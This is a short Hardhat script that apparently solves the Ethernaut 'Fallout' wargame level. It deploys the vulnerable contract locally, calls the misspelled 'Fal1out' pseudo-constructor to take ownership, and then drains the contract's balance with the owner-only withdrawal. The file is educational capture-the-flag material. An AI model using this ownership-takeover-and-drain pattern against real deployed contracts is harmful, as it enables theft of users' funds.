import { ethers } from "hardhat";

async function main() {
  const [deployer] = await ethers.getSigners();

  const Fallout = await ethers.getContractFactory("Fallout");
  const fallout = await Fallout.deploy();
  await fallout.deployed();

  // calling the 'constructor' function
  await fallout.Fal1out({ value: ethers.utils.parseEther("0.001") });

  // veryfing the owner
  console.log(
    "Did the owner changed?",
    (await fallout.owner()) == deployer.address
  );

  // Draining the contract's balance
  // Method protected by the 'onlyOwner' modifier
  await fallout.collectAllocations();

  // Veryfing the balance
  console.log("Balance:", await ethers.provider.getBalance(fallout.address));
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
